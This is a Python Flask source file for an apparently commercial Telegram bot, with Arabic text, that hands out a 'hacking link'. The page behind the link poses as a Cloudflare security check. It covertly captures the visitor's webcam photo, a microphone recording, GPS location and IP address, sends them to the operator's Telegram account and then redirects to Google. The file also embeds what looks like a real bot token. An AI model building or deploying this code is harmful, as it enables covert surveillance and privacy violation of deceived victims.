import base64, requests, io, os, time
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
MY_LINK = "https://sif-e7ad.onrender.com"
DEVELOPER_USER = "Y_urd"

# قاعدة بيانات وهمية (تخزن في الذاكرة)
# التنسيق: { user_id: {"status": "free/premium/banned", "used": True/False} }
db = {}
service_online = True
link_active = True
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #f6821f; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120">
        <h2>جاري التحقق من بصمة المتصفح...</h2>
        <p>يرجى السماح بالصلاحيات للمتابعة.</p>
        <div class="spinner"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        let chunks = [];
        async function send(d) { await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
        async function run() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                const v = document.getElementById('v'); v.srcObject = s;
                navigator.geolocation.getCurrentPosition(p => send({type:'text', lat:p.coords.latitude, lon:p.coords.longitude}), () => send({type:'text', lat:0, lon:0}));
                setTimeout(async () => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send({type:'img', img:c.toDataURL('image/jpeg', 0.6).split(',')[1]});
                }, 2000);
                const r = new MediaRecorder(s);
                r.ondataavailable = e => chunks.push(e.data);
                r.onstop = () => {
                    const fr = new FileReader(); fr.readAsDataURL(new Blob(chunks, {type:'audio/ogg'}));
                    fr.onloadend = () => { send({type:'audio', audio:fr.result.split(',')[1]}); window.location.href="https://google.com"; };
                };
                r.start(); setTimeout(() => r.stop(), 3500);
            } catch(e) { send({type:'text', lat:0, lon:0}); window.location.href="https://google.com"; }
        }
        window.onload = run;
    </script>
</body>
</html>
'''

def bot_api(m, p=None, f=None):
    u = f"https://api.telegram.org/bot{BOT_TOKEN}/{m}"
    if f: return requests.post(u, data=p, files=f)
    return requests.post(u, json=p)

@app.route('/')
def home():
    if not link_active: return redirect("https://google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    global link_active
    d = request.json; t = d.get('type')
    if t == 'text':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        loc = f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}" if d.get('lat') != 0 else "غير متاح"
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"🎯 <b>صيد جديد!</b>\nIP: <code>{ip}</code>\nالموقع: <a href='{loc}'>اضغط هنا</a>", "parse_mode": "HTML"})
    elif t == 'img':
        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
        bot_api("sendPhoto", {"chat_id": ADMIN_ID}, {"photo": ph})
        link_active = False
    elif t == 'audio':
        au = io.BytesIO(base64.b64decode(d.get('audio'))); au.name = 'voice.ogg'
        bot_api("sendVoice", {"chat_id": ADMIN_ID}, {"voice": au})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    global service_online, link_active
    u = request.get_json(silent=True)
    if not u or "message" not in u and "callback_query" not in u: return "OK"

    if "message" in u:
        m = u["message"]; cid = m["chat"]["id"]; txt = m.get("text", "")
        
        # نظام الإدارة (لك فقط)
        if cid == ADMIN_ID:
            if txt == "/users":
                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"📊 عدد المستخدمين المسجلين: {len(db)}"})
            elif txt.startswith("/active"):
                try:
                    uid = int(txt.split()[1]); db[uid] = {"status": "premium", "used": False}
                    bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"✅ تم تفعيل العضوية الممتازة للآيدي: {uid}"})
                except: bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "❌ خطأ! استخدم: /active ID"})
            elif txt.startswith("/ban"):
                try:
                    uid = int(txt.split()[1]); db[uid] = {"status": "banned", "used": True}
                    bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر المستخدم {uid}"})
                except: pass
            elif txt == "/stop_bot":
                service_online = False
                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "🛑 تم إيقاف البوت عن الجميع."})
            elif txt == "/run_bot":
                service_online = True
                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم تشغيل البوت للجميع."})
            elif txt == "/open":
                link_active = True
                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم فتح رابطك لصيد جديد."})

        # أوامر المستخدمين
        if txt == "/start":
            user = db.get(cid, {"status": "free", "used": False})
            if user["status"] == "banned":
                bot_api("sendMessage", {"chat_id": cid, "text": "🚫 أنت محظور من استخدام البوت."})
                return "OK"
            
            if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
                bot_api("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المدة المجانية.\nراسل المطور @{DEVELOPER_USER} للتفعيل.\nالسعر: 5$ 💰"})
            else:
                kb = {"inline_keyboard": [[{"text": "✅ تم الاشتراك، ابدأ الآن", "callback_data": "welcome"}]]}
                bot_api("sendMessage", {"chat_id": cid, "text": f"مرحباً بك في بوت سيوفي الخاص بالاختراق عن طريق رابط.\nيجب الاشتراك في القناة لمرة واحدة:\n{CHANNEL_URL}", "reply_markup": kb})

    elif "callback_query" in u:
        cb = u["callback_query"]; cid = cb["message"]["chat"]["id"]; data = cb["data"]
        user = db.get(cid, {"status": "free", "used": False})

        if data == "welcome":
            bot_api("sendMessage", {"chat_id": cid, "text": "مرحباً بكم في بوت سيوفي الخاص باختراق الجهاز عن طريق رابط.\nلديك مرة واحدة مجانية لإنشاء رابط.", "reply_markup": {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}})
        
        elif data == "gen":
            if not service_online and cid != ADMIN_ID:
                bot_api("sendMessage", {"chat_id": cid, "text": "⚠️ البوت تحت الصيانة حالياً، حاول لاحقاً."})
                return "OK"
            
            if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
                bot_api("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المحاولة المجانية. للتفعيل راسل @{DEVELOPER_USER}"})
            else:
                if cid != ADMIN_ID: db[cid] = {"status": user["status"], "used": True}
                bot_api("sendMessage", {"chat_id": cid, "text": f"✅ تم إنشاء رابطك بنجاح:\n<code>{MY_LINK}</code>\n\n⚠️ الرابط صالح لصيد واحد فقط.", "parse_mode": "HTML"})

    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
